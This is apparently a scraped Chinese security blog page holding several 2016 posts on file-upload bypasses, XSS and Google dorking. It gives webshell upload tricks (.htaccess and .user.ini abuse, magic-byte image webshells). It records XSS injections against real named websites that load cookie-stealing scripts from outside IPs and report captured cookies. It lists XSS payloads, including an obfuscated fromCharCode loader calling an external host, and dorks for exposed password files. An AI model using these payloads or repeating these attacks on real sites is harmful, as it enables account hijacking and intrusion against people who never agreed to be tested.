+<p><br>对于上面的过滤可以通过如下方法绕过：</p>
+<ul>
+<li>从黑名单中找到web开发者忽略的扩展名，如：cer</li>
+<li>没有对扩展名进行大小写转换，在window平台依然可以大小写绕过</li>
+<li>在window下，若文件名以”.”或者空格作为结尾，系统会自动去除”.”与空格，<br>所以可以上传以“asp.”和“asp_”为扩展名的文件</li>
+<li>0x00截断绕过</li>
+<li>解析漏洞</li>
+</ul>
+<pre><code>* 白名单过滤方式
+</code></pre><p><table><tr><td bgcolor="#7FFFD4"> </td></tr></table></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$WhiteList = array(&apos;rar&apos;,&apos;jpg&apos;,&apos;png&apos;,&apos;bmp&apos;,&apos;gif&apos;,&apos;jpg&apos;,&apos;doc&apos;);</div><div class="line">if(isset($_POST[&quot;submit&quot;]))&#123;</div><div class="line">    $name = $_FILES[&apos;file&apos;][&apos;name&apos;];</div><div class="line">    $extension = substr(strrchr($name,&quot;.&quot;),1);</div><div class="line">    $boo = false;</div><div class="line">    foreach($WhiteList as $key =&gt; $value)&#123;</div><div class="line">        if($value==$extension)&#123;</div><div class="line">            $boo = true;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if($boo)&#123;</div><div class="line">        $size = $_FILES[&apos;file&apos;][&apos;size&apos;];</div><div class="line">        $tmp = $_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</div><div class="line">        move_uploaded_file($tmp,$name);</div><div class="line">        echo &quot;文件上传成功！&lt;br/&gt;path:&quot;.$name;</div><div class="line">    &#125;else&#123;</div><div class="line">        echo &quot;文件不合法！&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><br>绕过方法：</p>
+<ul>
+<li>0x00截断绕过</li>
+<li>此时若在iis6.0，则可以将木马名改为test.asp;1.jpg来上传，从而通过验证</li>
+<li>配合解析漏洞</li>
+</ul>
+<p>MIME验证对文件MIME类型做验证的PHP代码如下：</p>
+<p><table><tr><td bgcolor="#7FFFD4"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?phpif($_FILES[&apos;file&apos;][&apos;type&apos;]==&quot; image/jpeg&quot;)&#123;</div><div class="line">    $imageTempName = $_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</div><div class="line">    $imageName = $_FILES[&apos;file&apos;][&apos;name&apos;];</div><div class="line">    $last = substr($imageName,strrpos($imageName,&quot;.&quot;));</div><div class="line">    if(!is_dir(&quot;uploadFile&quot;))&#123;</div><div class="line">        mkdir(&quot;uploadFile&quot;);</div><div class="line">    &#125;</div><div class="line">    $imageName = md5($imageName).$last;</div><div class="line">    move_upload_file($imageTempName,&quot;./uploadFile/&quot;.$imageName);</div><div class="line">    echo(&quot;文件上传成功！ path = /uploadFile/$imageName&quot;);</div><div class="line">&#125;else&#123;</div><div class="line">    echo(&quot;文件上传类型错误，请重新上传...&quot;);</div><div class="line">    exit();</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></td></tr></table></p>
+<p><br>未修改MIME类型，上传失败：<br>修改MIME类型，上传成功：<br>目录验证文件上传时通常允许用户将文件放到指定的目录中，若目录存在则将文件写入目录，否则新建目录然后写入，若为iis6.0则可以利用这个漏洞，客户端上传代码如下：</p>
+<p><table><tr><td bgcolor="#7FFFD4"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> &lt;html&gt;&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">&lt;title&gt;up&lt;/title&gt;&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br/&gt;</div><div class="line">    &lt;input type=&quot;hidden&quot; name=&quot;Extension&quot; value=&quot;up&quot; /&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure></td></tr></table></p>
+<p><br>服务端PHP接收文件的代码如下：</p>
+<p><table><tr><td bgcolor="#7FFFD4"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">    $imageTempName=$_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</div><div class="line">    $imageName=$_FILES[&apos;file&apos;][&apos;name&apos;];</div><div class="line">    $last=substr($imageName,strrpos($imageName,&quot;.&quot;));</div><div class="line">    if($last!=&quot;.jpg&quot;)&#123;</div><div class="line">        echo(&quot;mime error!&lt;br/&gt;&quot;);</div><div class="line">    &#125;</div><div class="line">    $Extension=$_POST[&apos;Extension&apos;];</div><div class="line">    if(!is_dir($Extension))&#123;</div><div class="line">        mkdir(&quot;./$Extension&quot;);</div><div class="line">        echo &quot;mkidr $Extension succesfully&quot;.&quot;&lt;br/&gt;&quot;;</div><div class="line">    &#125;</div><div class="line">    $imageName=md5($imageName).$last;</div><div class="line">    move_uploaded_file($imageTempName,&quot;./$Extension/&quot;.$imageName);</div><div class="line">    echo(&quot;upload ok! path = /$Extension/$imageName&quot;);</div><div class="line">&#125; else &#123;</div><div class="line">    echo(&quot;type error...&quot;);</div><div class="line">    exit();</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></td></tr></table></p>
+<p><br>查看上传到了那个文件：<br>将文件改名：<br>截断上传攻击截断上传攻击在ASP程序中比较常见(在PHP、JSP中也有) 先上传正常后缀的图片马：<br>更改图片名字：</p>
+<p>截断：</p>
+<p>上传成功：<br>文件攻击</p>
+<pre><code>* .htaccess文件攻击
+</code></pre><p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”haha”这个字符串的任意文件，无论扩展名是什么(没有也行)，都以php的方式来解析，.haccess文件代码如下：</p>
+<filesmatch "haha"="">SetHandler application/x-httpd-php<br></filesmatch><br>或者如下，上传一个文件名为evil.gif的图片马：<br><filesmatch "evil.gif"=""><br><br>SetHandler application/x-httpd-php<br></filesmatch>
+
+<pre><code>* .user.ini文件攻击
+</code></pre><p>只要中间键是以fastcgi运行的php都可以用这个方法，.user.ini能被动态加载，它也有两个配置<br>项：auto_append_file和auto_prepend_file，只要在.user.ini中添加auto_prepend_file=aa.jpg<br>这句话，就可以让其他php文件执行前自动包含aa.jpg，和require()类似。</p>
+<p>检测文件内容</p>
+<pre><code>* 文件幻数检测
+</code></pre><p>在文件首部加上如下幻数，后面跟一句话木马即可</p>
+<p>JFIF    FF D8 FF E0 00 10 4A 46 49 46<br>GIF89a  47 49 46 38 39 61<br>PNG     89 50 4E 47</p>
+<pre><code>* 文件相关信息检测
+</code></pre><p>通常用的getimagesize()函数，只需要在幻数基础上加一些文件信息就行了，如下：</p>
+<p>GIF89a<br>(…some binary data for image…)<br>&lt;?php phpinfo(); ?&gt;<br>(… skipping the rest of binary data …)</p>
+<pre><code>* 文件加载检测
+</code></pre><p>服务端会调用API或函数对文件进行加载测试，常见的是图像渲染测试，变态的甚至是二次渲染：</p>
+<p>对渲染/加载测试的攻击方式是代码注入绕过<br>对二次渲染的攻击方式是攻击文件加载器本身</p>
+<p>文件上传之文本编辑器漏洞<br>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。<br>下面以FCKeditor(现名为CKEditor)为例：<br>1、敏感信息暴漏<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">* 查看版本信息</div><div class="line">    /FCKeditor/editor/dialog/fck_about.html</div><div class="line">* 默认上传页面</div><div class="line">    /FCKeditor/editor/filemanager/browser/default/browser.html</div><div class="line">    /FCKeditor/editor/filemanager/browser/default/connectors/test.html</div><div class="line">    /FCKeditor/editor/filemanager/upload/test.html</div><div class="line">    /FCKeditor/editor/filemanager/connectors/test.html</div><div class="line">    /FCKeditor/editor/filemanager/connectors/uploadtest.html</div><div class="line">* 其他敏感文件</div><div class="line">    /FCKeditor/editor/filemanager/connectors/aspx/connector.html</div><div class="line">    /FCKeditor/editor/filemanager/connectors/asp/connector.html</div><div class="line">    /FCKeditor/editor/filemanager/connectors/php/connector.php</div></pre></td></tr></table></figure></p>
+<p>2、黑名单策略错误<br>    FCKeditor&lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名<br>3、任意文件上传漏洞<br>    FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行，<br>在form中的action=”<a href="http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=M" target="_blank" rel="external">http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=M</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-26T08:58:05.000Z"><a href="/2016/07/26/文件上传/">2016-07-26</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/07/26/文件上传/">文件上传</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p><strong>文件上传攻击的原理</strong><br>由于服务器端没有对用户上传的文件进行正确的处理，导致攻击者可以向某个可通过 Web 访问的目录上传恶意文件，并且该文件可以被Web服务器解析执行。<br>攻击者要想成功实施文件上传攻击，必须要满足以下三个条件：<br>1.可以上传任意脚本文件，且上传的文件能够被Web服务器解析执行，具体来说就是存放上传文件的目录要有执行脚本的权限。<br>2.用户能够通过Web访问这个文件。如果文件上传后，不能通过Web访问，那么也不能成功实施攻击。<br>3.要知道文件上传到服务器后的存放路径和文件名称，因为许多Web应用都会修改上传文件的文件名称，那么这时就需要结合其他漏洞去获取到这些信息。如果不知道上传文件的存放路径和文件名称，即使你上传了也无法访问。</p>
+<p><strong>什么是文件上传漏洞</strong></p>
+<p>为了让用户将文件上传到服务器，就像是给危及服务器的恶意用户打开<br>网站后台权限     增删改查<br>服务器权限<br>网站权限</p>
+<p><a href="https://github.com/litten/hexo-theme-yilia" target="_blank" rel="external">https://github.com/litten/hexo-theme-yilia</a></p>
+<p>服务器配置不当</p>
+<p>当服务器配置不当时，在不需要上传页面的情况下便可导致任意文件上传<br>开源编辑器上传漏洞<br>fckeditor<br>ckeditor</p>
+<p><strong>php文件上传时php能够获取文件什么信息</strong></p>
+<p>通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。<br>第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：</p>
+<pre><code>* $_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称
+* $_FILES[&quot;file&quot;][&quot;type&quot;] - 被上传文件的类型
+* $_FILES[&quot;file&quot;][&quot;size&quot;] - 被上传文件的大小，以字节计
+* $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称
+* $_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码
+</code></pre><p><strong>一般情况下php过滤那些信息</strong><br>白名单过滤和黑名单过滤<br>主要是类型<br>还有一个就是大小<br>目录路径检测<br>文件扩展名</p>
+<p>服务端：<br>打开php.ini文件，找到下面四项（其实看注释也明白了）：<br>file_uploads：是否允许通过HTTP传递文件，默认是On允许；<br>upload_max_filesize：允许传递文件的最大大小，以M为单位，这是服务端配置文件设定的选项；<br>max_file_uploads：一次请求所允许传递的做多文件个数；<br>post_max_size：通过POST传递数据的最大大小，因为文件传递也是post方式，也算post传递，需要特别注意的是，它必须要 大于upload_max_filesize选项，因为在一次post传递过程中不仅会上传文件，还会传递其他数值，比如上面的POST数组中的数据，必 须考虑到，比如upload_max_filesize设为150M，这个就可以设为200M;<br>客户端：</p>
+<p>文件上传最基本的方法是通过form表单进行POST传递文件，实际上通过PUT方法也可以上传文件，只不过这种方法不安全，需要配置一些安全 验证机制，这里只写最常用的方式。form表单的input标签可以设置成文件上传按钮type=”file”，直接解决了如何选择文件的问题，接下来需 要设置form的两个属性：enctype和method<br>enctype:设置成multipart/form-data<br>method:设置成post<br>关于enctype属性设置可参考W3School的解释</p>
+<p>第一条是默认的值，在我们使用HTTP协议传递一般的表单数据时，实际上默认对数据进行了分块编码，比如默认的urlencode方式（空格转为+，其他 非字母字符转为%加两个十六进制大写数）；当enctype设置为第二个时，不会进行字符编码，使用上传控件（input标签type设为file时即 是）上传文件， 必须 设定为这个值；第三个则是值对空格编码为+，但不对非字母字符进行编码。</p>
+<p><strong>有可能被检测对应http数据包的那些部分</strong><br>主要是content-type  还有content-length filename=</p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-22T07:08:13.000Z"><a href="/2016/07/22/xss实例/">2016-07-22</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/07/22/xss实例/">xss实例</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>#时光网#<br>登录之后<br>有一个我关注的话题然后<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"></p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"></p>
+<p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"><br>并没有转换为实体编码，有xss漏洞<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%874.png?raw=true" alt="image"><br>在控制台测试函数$loadjs函数可以利用<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%875.png?raw=true" alt="image"><br>用$loadjs()函数构造payload<br><a href="http://163.44.171.86/ssss.js" target="_blank" rel="external">http://163.44.171.86/ssss.js</a></p>
+<p><a href="svg/onload=”b=’http://’163”">svg/onload=”b=’http://’163”</a></p>
+<p><svg onload="”b+=’.44.171.86’”"/></p>
+<p><svg onload="”b+=’/ssss.js’”"/></p>
+<p><svg onload="”$loadjs(b)”"><br/>查看一下有没有转换<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%876.png?raw=true" alt="image"/><br/>没有转换为实体编码应该就可以了<br/>发链接给别人<br/>获取cookie<br/><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%877.png?raw=true" alt="image"/></svg></p>
+<p>#南方人物周刊xss实验报告#<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%878.png?raw=true" alt="image"><br>存在xss的点，每次加载都会弹出来<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%879.png?raw=true" alt="image"><br>查看网页源代码，发现网页有两个地方触发了js<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8710.png?raw=true" alt="image"><br>一个是标题的地方<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8711.png?raw=true" alt="image"><br>一个是会员的姓名<br>第二个对于我们来说是可以控制的，然后我们就可以利用构造payload<br>缩短前的网址<a href="http://123.206.18.223/probe.js——&gt;缩短后的网址：http://t.im/16ar4" target="_blank" rel="external">http://123.206.18.223/probe.js——&gt;缩短后的网址：http://t.im/16ar4</a><br>重新构造payload：payload：<script src="”http://t.im/16ar4”"><br>让网页加载外部服务器中构造的JS文件<br>发现有长度限制，还是不行</p>
+<p>#唯宝网#</p>
+<p>发现在写日记哪里存在xss<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8712.png?raw=true" alt="image"><br>于是我换成获取饼干的js代码”/&gt;<script src='http://115.159.126.186/x.js'></script>  并在源码中插入有效成功</p>
+<p>中兴论坛<br>发帖哪里存在xss<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8713.png?raw=true" alt="image"><br>然后抓包<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8714.png?raw=true" alt="image"><br>在我的444后面写上服务器的网址</p>
+<p><script src="http://163.44.171.86/ssss.js"></script><br>获取到cookie的信息<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/7/%E5%9B%BE%E7%89%8715.png?raw=true" alt="image"></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-18T13:26:46.000Z"><a href="/2016/07/18/xss的挖掘和利用/">2016-07-18</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/07/18/xss的挖掘和利用/">xss的挖掘和利用</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>#什么是XSS#<br>即跨站脚本发生在浏览器上<br>为什么用户浏览器渲染整个html文档出现了不可预期的脚本指令并执行<br>跨站脚本重要的是脚本<br>对于网站是不可预期的，对于攻击者是可预期的<br>这类攻击主要是浏览器解析执行的，浏览器不是看到什么就解析什么，不符合规定就不会执行。浏览器安全策略：同源策略<br>漏洞挖掘</p>
+<ul>
+<li>1.用户提交的脚本指令</li>
+<li>2提交服务器脚本没有过滤完整</li>
+<li>3输出的时候<br>浏览器渲染解析你的指令就能执行</li>
+</ul>
+<p>#漏洞利用#<br>js可以获取什么，xss就可以获取什么<br>xss的危害：<br>获取管理员的cookie<br>xss worm<br>挂马（水坑攻击）<br>键盘记录（有局限性）<br>利用网站重定向<br>修改网页内容<br>攻击场景：<br>在各类的sns、邮件系统、开源流行的web应用、bbs、微博社交等，主要是一些大型的网站才有价值<br>支持html解析和javascript解析的客户端，如：html文档、flash、pdf等<br>form表单提交的内容出现在网页上 如：昵称、邮箱、简介、留言</p>
+<p>#同源策略：#</p>
+<p><a href="https://github.com/evilcos/xssprobe">https://github.com/evilcos/xssprobe</a></p>
+<p>#xss分类#<br>反射型xss(非持久型)<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">反射型xss也被称为非持久型xss，是现在最容易出现的一种xss漏洞，xss代码出现在url中，最后输入提交到服务器中，服务器解析后响应出现这段xss代码，最后浏览器解析执行</div><div class="line">    简单的流程：</div><div class="line">用户访问带有xss代码的url请求</div><div class="line">服务器接收后处理，将返回的带有xss代码的数据发送给浏览器</div><div class="line">浏览器解析带有xss代码的数据后，最终造成xss漏洞</div><div class="line">可能攻击流程：</div><div class="line">    • 用户aaa在网站www.xxx.com浏览网页</div><div class="line">    • 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码，代码功能为盗取用户Cookie并发送到指定站点www.xxser.com</div><div class="line">    • hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击</div><div class="line">    • 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com</div><div class="line">    • hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息</div><div class="line"></div><div class="line"></div><div class="line">储存型xss</div><div class="line">存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动 触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被 XSS，其中最典型的例子就是留言板。</div><div class="line">区别在于：提交的xss代码会存储在服务器中，下次请求时就不用再提交xss代码</div><div class="line">留言板 </div><div class="line">&lt;code&gt;</div><div class="line">测试技巧：</div></pre></td></tr></table></figure></p>
+<pre><code>• 首先确定输入点和输出点，比如留言，若留言输出(显示)的地方是标签内，则XSS代码会被执行，但若输出在属性内，则不会执行，
+
+&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot; /&gt;
+在输入框中输入&lt;script&gt;alert(/xss/)&lt;script&gt;就可以测试
+• 确定输出点后根据相应的标签构造HTML代码来闭合，如：‘ /&gt;&lt;script&gt;alert(1)&lt;script&gt;&lt;’，最终在html中为：
+</code></pre><p> <script>alert(1)<script>&lt;”” /&gt;<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">测试步骤：</div></pre></td></tr></table></figure></p>
+<pre><code>• 添加正常留言，用firebug快速查找显示标签，若显示区域不在html属性内则可以直接使用XSS代码注入
+• 若不能得知内容输出的位置，可以使用模糊测试方案，XSS代码如下：
+    a. &lt;script&gt;alert(document.cookie)&lt;script&gt;  //普通注入
+    b. &quot; /&gt;&lt;script&gt;alert(document.cookie)&lt;script&gt;   //闭合标签注入
+    c. &lt;/textarea&gt;&apos;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;script&gt;   //闭合标签注入
+</code></pre><p></code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">#xss的检测#</div><div class="line"></div><div class="line">xss分为手工检测和软件自动检测</div><div class="line">手工检测：检测结果准确，但对于大型web来说费时费力</div><div class="line">软件检测：方便省力，但存在误报，且有写隐蔽的XSS无法检测出</div><div class="line">检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出</div><div class="line">1.手工检测</div></pre></td></tr></table></figure></p>
+<p><code><br>由输出位置：输入敏感字符，如“&lt;、&gt;”‘、’（）”等提交后查看html的源代码<br> 很多web应用程序源码不公开，在测试时不能的值输出位置，比如，有些留言本在留言后必须经过管理员审核才能显示，无法的值数据在后台管理页面处于何种状态，如：<br>    在标签中：<div>XSS Test</div><br>    在属性内：<input type="text" name="" /></p>
+<p>在输入框中输入content” value=”XSS Test<br>    这种情况通常采用输入”/&gt;XSS Test来测试。<br></code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">2.全自动检测xss</div><div class="line">这个就不用多说了工具上</div><div class="line">appscan,wvs,burpsuit等软件都可以有效的检测xss，还会检测其他的漏洞</div><div class="line">专业的xss扫描还有xssER、xssf等，还有专门扫描dom类型xss的web服务</div><div class="line"></div><div class="line">3.xss漏洞的挖掘</div><div class="line">&lt;code&gt;</div><div class="line">反射型xss:</div><div class="line">一般url参数中的值能够回显到html中，url的参数过滤不严谨</div><div class="line">存储型xss:</div><div class="line">可以提交内容</div><div class="line">提交内容可被管理员或其他用户看到</div><div class="line"></div><div class="line">&lt;/code&gt;</div><div class="line">4.xss一般就是闭合标签，和sql注入类似，常见payload如下：</div></pre></td></tr></table></figure></p>
+<p><code><br> <script src='http://b.ioio.pub/xss/probe.js'><script><br>• <img src=x onerror="s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'";><br>• &lt;svg onload=s=createElement(‘script’);body.appendChild(s);s.src=’<a href="http://b.ioio.pub/xss/probe.js&gt;">http://b.ioio.pub/xss/probe.js&gt;</a><br>• <svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,112,114,111,98,101,46,106,115)) ><br></code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xss简单示例</div><div class="line">发射型xss实列</div></pre></td></tr></table></figure></p>
+<p>&lt;?php<br>  echo $_GET[‘x’];<br>提交：<br>/xss.php?x=  &lt; scri pt&gt;alert(1)<script><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务器解析时就会触发弹窗</div><div class="line"></div><div class="line">?&gt;</div><div class="line">下面是一段经典的DOM型XSS示例：</div></pre></td></tr></table></figure></p>
+<p><script><br>    var temp = document.URL; //获取URL<br>    var index = document.URL.indexOf(“content”);<br>    var par = temp.substrint(index);<br>    document.write(decodeURL(par)); //输入获取内容<script><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">上述代码的意思是获取URL中content参数的值，并且输出，若输入```http://www.xxx.com/dom.html?content=&lt;script&gt;alert(/xss/)&lt;script&gt;```，就会产生XSS漏洞。</div><div class="line"></div><div class="line">xss的防御</div><div class="line">使用htmlspecialchars()和hemlentities()将一些预定义的字符转换为html实体</div><div class="line">```&lt;?php</div><div class="line">              $html = $_GET[&apos;x&apos;];</div><div class="line">   if($html)&#123;</div><div class="line">echo htnlspecialchars($html）&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+      
+    </div>
+    <footer>
+      
+        
+          <div class="alignleft">
+            <a href="/2016/07/18/xss的挖掘和利用/#more" class="more-link">Read More</a>
+          </div>
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-18T12:07:37.000Z"><a href="/2016/07/18/google-hacking/">2016-07-18</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2016/07/18/google-hacking/">google hacking</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="高级搜索符"><a href="#高级搜索符" class="headerlink" title="高级搜索符"></a>高级搜索符</h1><p>intitle allintitle 页面标题里查找关键字<br>filetye 查找指定文件类型<br>site 锁定站点<br>inurl allinurl 在url中查找关键字<br>intext allintext 网页查找关键字<br>link 搜索链接到某个网站的连接<br>排除字域名<br>site:baidu.com -site:www.baidu,com<br>site:video.baidu.com<br>实例：sql注入页面<br>site:tw inurl:?id=1..10000000 filetype:php<br>管理员登录界面：intitle:”后台登录”</p>
+<ul>
+<li><p>目录遍历 inurl:””<br>intext:”index of” intitle:”index of”<br>intext:”Parent Directory” intitle:”index of”</p>
+</li>
+<li><p>用户名和密码的文件<br>intext:”用户名 and 密码” filetype:txt<br>intext:”username:” and “password:”filetype:txt</p>
+</li>
+<li><p>电子邮件列表<br>intext:”index of” intext:.emal</p>
+</li>
+<li><p>指定端口的网站<br>inurl:8080 -intext:8080<br>敏感文件<br>  filetype:.inc intext:mysql_connect and username<br>特定网站<br>site:tw intitle:”apache tomcat” inurl:8080<br>政府军事数据：.gov</p>
+</li>
+</ul>
+
+      
